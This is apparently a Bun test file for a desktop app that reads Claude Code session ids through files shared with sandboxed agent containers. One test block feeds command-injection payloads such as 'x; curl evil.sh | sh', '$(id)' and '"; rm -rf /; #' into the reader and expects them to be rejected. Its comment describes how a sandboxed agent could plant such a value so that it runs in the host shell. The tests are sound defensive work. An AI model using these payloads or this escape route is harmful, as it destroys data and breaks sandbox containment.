import { test, expect, afterEach } from "bun:test";
import { mkdtempSync, mkdirSync, writeFileSync, existsSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  sanitizeToken,
  deskSessionFileName,
  deskSessionPath,
  readDeskSessionId,
  readDeskSession,
  liveRotationId,
  clearDeskSessionId,
} from "../desktop/src/main/desk-session.ts";
import { onDeckError } from "../desktop/src/main/log.ts";
// Cross-check the Deck reader against the core writer (filename must match).
import { writeDeskSessionId, deskSessionFileName as coreFileName } from "../shared/peer-cache.ts";

const tmpDirs: string[] = [];
function tmpPeers(): string {
  const d = mkdtempSync(join(tmpdir(), "cp-desksess-"));
  tmpDirs.push(d);
  return d;
}
afterEach(() => {
  for (const d of tmpDirs.splice(0)) {
    try {
      rmSync(d, { recursive: true, force: true });
    } catch {
      // best-effort
    }
  }
});

test("sanitizeToken mirrors sanitizeSessionId (non [A-Za-z0-9-] -> _, cap 64)", () => {
  expect(sanitizeToken("tile-123")).toBe("tile-123");
  expect(sanitizeToken("a/b c")).toBe("a_b_c");
  expect(sanitizeToken(undefined)).toBe("");
  expect(sanitizeToken("x".repeat(200)).length).toBe(64);
});

test("deskSessionFileName matches the core writer's filename", () => {
  for (const token of ["tile-A", "a/../b", "abc"]) {
    expect(deskSessionFileName(token)).toBe(coreFileName(token));
  }
});

test("readDeskSessionId returns the file content for a token, null when absent", () => {
  const peers = tmpPeers();
  expect(readDeskSessionId("tile-A", peers)).toBeNull();
  writeFileSync(deskSessionPath("tile-A", peers), "real-id-123\n", "utf-8");
  expect(readDeskSessionId("tile-A", peers)).toBe("real-id-123");
});

test("readDeskSessionId returns null for an empty file and an empty token", () => {
  const peers = tmpPeers();
  writeFileSync(deskSessionPath("t", peers), "   \n", "utf-8");
  expect(readDeskSessionId("t", peers)).toBeNull();
  expect(readDeskSessionId("", peers)).toBeNull();
});

test("clearDeskSessionId removes the token file (no throw on miss)", () => {
  const peers = tmpPeers();
  const path = deskSessionPath("t", peers);
  writeFileSync(path, "id", "utf-8");
  expect(existsSync(path)).toBe(true);
  clearDeskSessionId("t", peers);
  expect(existsSync(path)).toBe(false);
  // Second clear on an absent file is a silent no-op.
  expect(() => clearDeskSessionId("t", peers)).not.toThrow();
});

test("round-trip: core writeDeskSessionId is read back by the Deck reader", async () => {
  const home = tmpPeers();
  await writeDeskSessionId(home, {
    CLAUDE_PEERS_DESK_SESSION: "tile-X",
    CLAUDE_CODE_SESSION_ID: "minted-uuid-999",
  });
  const peers = join(home, ".claude", "peers");
  expect(readDeskSessionId("tile-X", peers)).toBe("minted-uuid-999");
});

test("two tiles read their own id with no permutation (D1)", () => {
  const peers = tmpPeers();
  mkdirSync(peers, { recursive: true });
  writeFileSync(deskSessionPath("tileA", peers), "id-A", "utf-8");
  writeFileSync(deskSessionPath("tileB", peers), "id-B", "utf-8");
  expect(readDeskSessionId("tileA", peers)).toBe("id-A");
  expect(readDeskSessionId("tileB", peers)).toBe("id-B");
});

// ----- back-channel value validation (sandbox escape, review finding #1) -----

test("readDeskSessionId REFUSES a tampered value (sandbox escape chain)", () => {
  // The file lives in a dir mounted into sandbox containers, so its content is
  // attacker-controlled. The adopted id later reaches the host shell as
  // `--resume <id>`; without validation a sandboxed agent could plant a payload
  // in another tile's file and have it run OUTSIDE the sandbox.
  const dir = mkdtempSync(join(tmpdir(), "cp-desk-esc-"));
  try {
    for (const payload of [
      "x; curl evil.sh | sh",
      "$(id)",
      "`id`",
      "a b",
      "../../etc/passwd",
      '"; rm -rf /; #',
      "x".repeat(65)
    ]) {
      writeFileSync(join(dir, deskSessionFileName("tok")), payload, "utf-8");
      expect(readDeskSessionId("tok", dir)).toBeNull();
    }
    // A well-formed id still round-trips.
    writeFileSync(join(dir, deskSessionFileName("tok")), "0f9a-BEEF-42\n", "utf-8");
    expect(readDeskSessionId("tok", dir)).toBe("0f9a-BEEF-42");
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// ----- who wrote the back-channel (a child claude inherits the tile's token) -----

test("once the tile adopted a real id, a child claude's register write in today's plain format is ignored", () => {
  const peers = tmpPeers();
  writeFileSync(deskSessionPath("tile", peers), "child-sid-1\n", "utf-8");
  expect(liveRotationId(readDeskSession("tile", peers), "tile-sid-0", true)).toBeNull();
});

test("the tile's own /clear or compaction rotation is adopted after its first real id", () => {
  const peers = tmpPeers();
  for (const source of ["clear", "compact"]) {
    writeFileSync(deskSessionPath("tile", peers), JSON.stringify({ sid: "rotated-1", source }), "utf-8");
    expect([source, liveRotationId(readDeskSession("tile", peers), "tile-sid-0", true)]).toEqual([source, "rotated-1"]);
  }
});

test("once the tile adopted a real id, a register, startup or resume write is never a rotation", () => {
  const peers = tmpPeers();
  for (const source of ["register", "startup", "resume"]) {
    writeFileSync(deskSessionPath("tile", peers), JSON.stringify({ sid: "other-1", source }), "utf-8");
    expect([source, liveRotationId(readDeskSession("tile", peers), "tile-sid-0", true)]).toEqual([source, null]);
  }
});

test("a first write landing after discovery closed is adopted whatever its source, while no real id was adopted yet", () => {
  const peers = tmpPeers();
  for (const source of ["register", "startup", "resume"]) {
    writeFileSync(deskSessionPath("tile", peers), JSON.stringify({ sid: "late-tile-sid", source }), "utf-8");
    expect([source, liveRotationId(readDeskSession("tile", peers), "placeholder-sid", false)]).toEqual([
      source,
      "late-tile-sid",
    ]);
  }
});

test("a legacy plain-text file reads as a register write", () => {
  const peers = tmpPeers();
  writeFileSync(deskSessionPath("tile", peers), "legacy-sid\n", "utf-8");
  expect(readDeskSession("tile", peers)).toEqual({ sid: "legacy-sid", source: "register" });
});

test("an unknown or missing source never reads as a rotation", () => {
  const peers = tmpPeers();
  for (const body of [{ sid: "other-1", source: "clear!" }, { sid: "other-1" }]) {
    writeFileSync(deskSessionPath("tile", peers), JSON.stringify(body), "utf-8");
    expect([JSON.stringify(body), liveRotationId(readDeskSession("tile", peers), "tile-sid-0", true)]).toEqual([
      JSON.stringify(body),
      null,
    ]);
  }
});

test("a tampered sid inside the JSON record is refused like a plain one", () => {
  const peers = tmpPeers();
  writeFileSync(deskSessionPath("tile", peers), JSON.stringify({ sid: "$(id)", source: "clear" }), "utf-8");
  expect(readDeskSession("tile", peers)).toBeNull();
  writeFileSync(deskSessionPath("tile", peers), "{not json", "utf-8");
  expect(readDeskSession("tile", peers)).toBeNull();
});

test("a corrupt JSON back-channel is reported once per token, never swallowed", () => {
  const peers = tmpPeers();
  const reported: string[] = [];
  onDeckError((scope, text) => reported.push(`${scope}: ${text}`));
  try {
    writeFileSync(deskSessionPath("corrupt-a", peers), "{not json", "utf-8");
    writeFileSync(deskSessionPath("corrupt-b", peers), "{not json", "utf-8");
    expect(readDeskSession("corrupt-a", peers)).toBeNull();
    expect(readDeskSession("corrupt-a", peers)).toBeNull();
    expect(readDeskSession("corrupt-b", peers)).toBeNull();
  } finally {
    onDeckError(() => {});
  }
  expect(reported.length, reported.join("\n")).toBe(2);
  expect(reported[0]).toContain("corrupt-a");
  expect(reported[1]).toContain("corrupt-b");
});

test("the same id as the current one is never a rotation", () => {
  const peers = tmpPeers();
  writeFileSync(deskSessionPath("tile", peers), JSON.stringify({ sid: "tile-sid-0", source: "clear" }), "utf-8");
  expect(liveRotationId(readDeskSession("tile", peers), "tile-sid-0", false)).toBeNull();
});
